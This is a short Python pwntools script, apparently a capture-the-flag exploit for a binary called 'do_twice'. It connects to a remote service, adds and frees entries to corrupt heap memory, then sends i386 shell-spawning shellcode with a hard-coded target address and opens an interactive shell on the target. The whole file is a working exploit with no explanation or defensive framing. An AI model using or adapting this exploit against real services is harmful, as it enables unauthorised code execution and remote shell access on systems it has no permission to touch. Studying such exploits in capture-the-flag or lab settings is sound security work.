#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('do_twice'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def add_p(name):
    global seats
    r.sendlineafter('staff\n', '1')
    r.sendlineafter('is: ', name)
    seats += 1

def del_p():
    global seats
    r.sendlineafter('staff\n', '2')
    seats -= 1

def add_s(name, sth):
    global seats
    r.sendlineafter('staff\n', '3')
    r.sendlineafter('name is: ' if seats == 1 else 'name: ', name)
    r.sendlineafter('him: ', sth)
    seats += 1

def del_s():
    global seats
    r.sendlineafter('staff\n', '4')
    seats -= 1

seats = 0
r = remote(HOST, PORT)
add_p('p')
add_p('p')
del_p()
del_p()
pause()

add_s(asm(shellcraft.i386.sh()), p32(0x804b0c0).ljust(20) + p32(0x804b0c0))

r.interactive()
